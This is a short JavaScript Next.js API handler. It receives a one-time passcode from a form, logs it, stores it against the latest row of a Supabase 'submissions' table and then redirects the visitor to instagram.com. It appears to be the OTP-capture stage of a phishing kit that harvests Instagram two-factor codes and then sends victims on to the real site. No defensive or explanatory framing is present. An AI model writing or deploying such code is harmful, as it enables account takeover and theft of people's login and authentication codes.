import { createClient } from '@supabase/supabase-js';

const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL,
  process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
);

export const config = {
  api: {
    bodyParser: false, // disables automatic body parsing
  },
};

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    res.status(405).json({ error: 'Method Not Allowed' });
    return;
  }

  try {
    let body = '';
    await new Promise((resolve, reject) => {
      req.on('data', chunk => {
        body += chunk.toString();
      });
      req.on('end', resolve);
      req.on('error', reject);
    });

    const parsed = new URLSearchParams(body);
    const otp = parsed.get('otp');
    console.log('✅ OTP received:', otp);

    const { data, error: selectError } = await supabase
      .from('submissions')
      .select('id')
      .order('created_at', { ascending: false })
      .limit(1)
      .single();

    if (selectError || !data) {
      console.error('❌ Select error:', selectError);
      return res.status(500).json({ error: 'No recent submission found' });
    }

    const { error: updateError } = await supabase
      .from('submissions')
      .update({ otp })
      .eq('id', data.id);

    if (updateError) {
      console.error('❌ Update error:', updateError);
      return res.status(500).json({ error: 'Failed to save OTP' });
    }

    // ✅ Respond and redirect
    res.writeHead(302, { Location: 'https://www.instagram.com' });
    res.end();

  } catch (err) {
    console.error('❌ Unexpected catch block error:', err);
    if (!res.headersSent) {
      res.status(500).json({ error: 'Unexpected server error' });
    }
  }
}
